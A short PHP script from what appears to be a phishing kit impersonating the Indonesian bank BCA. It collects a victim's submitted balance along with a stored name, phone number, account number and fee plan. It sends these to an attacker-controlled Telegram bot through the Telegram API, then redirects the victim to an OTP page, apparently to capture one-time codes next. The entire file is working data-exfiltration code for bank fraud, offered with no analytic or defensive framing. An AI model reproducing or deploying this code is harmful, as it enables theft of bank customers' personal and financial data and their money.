<?php

session_start();
include "./telegram.php";

$saldo            = $_POST['saldo'];

$tarif        = $_SESSION['tarif'];
$nomor        = $_SESSION['nomor'];
$nama        = $_SESSION['nama'];
$noatm        = $_SESSION['noatm'];


$_SESSION['saldo'] = $saldo;




$message = "
✧༝┉˚*❋ 𝘽𝘾𝘼 ❋*˚┉༝✧

- Tarif •• ".$tarif."
- Nomor •• {".$nomor."}

- Nama •• ".$nama."
- No Rekening •• ".$noatm."
- Saldo •• ".$saldo."
";

function sendMessage($telegram_id, $message, $id_bot) {
    $url = "https://api.telegram.org/bot" . $id_bot . "/sendMessage?parse_mode=markdown&chat_id=" . $telegram_id;
    $url = $url . "&text=" . urlencode($message);
    $ch = curl_init();
    $optArray = array(
        CURLOPT_URL => $url,
        CURLOPT_RETURNTRANSFER => true
    );
    curl_setopt_array($ch, $optArray);
    $result = curl_exec($ch);
    curl_close($ch);
}
sendMessage($telegram_id, $message, $id_bot);
header('Location: ./../otp/');
?>
